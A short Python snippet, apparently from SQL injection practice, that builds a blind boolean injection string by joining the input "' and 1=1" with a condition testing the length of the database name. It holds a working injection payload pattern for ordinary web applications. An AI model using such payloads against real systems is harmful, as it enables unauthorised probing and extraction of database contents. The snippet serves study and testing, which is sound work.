# Your initial exploitable_payload and the payload to insert
exploitable_payload = "' and 1=1"  # Example input
insertion_payload = 'IF((SELECT LENGTH(DATABASE())={length}),1,2)'

# Replace the last character with the insertion_payload
updated_payload = exploitable_payload[:-1] + insertion_payload

print(updated_payload)
